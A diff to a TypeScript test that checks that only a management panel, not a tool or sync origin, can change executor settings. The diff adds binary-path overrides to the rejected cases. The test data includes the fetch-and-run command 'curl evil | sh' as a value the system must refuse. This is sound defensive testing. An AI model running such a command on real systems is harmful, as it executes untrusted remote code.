@@ -899,7 +899,8 @@ it('lets only the panel change the execution environment, since it decides what 
   const executor = () => runtime.store.settings().executor
   const save = (value: Record<string, unknown>, origin: SettingsOrigin) => runtime.settings.save('executor', { ...executor(), ...value }, runtime.store.blockRevision('executor'), origin)
   for (const origin of ['tool', 'sync'] as const) {
-    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
+    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' },
+      { claudeBin: '/opt/claude' }, { opencodeBin: '/opt/opencode' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
   }
   expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
   expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
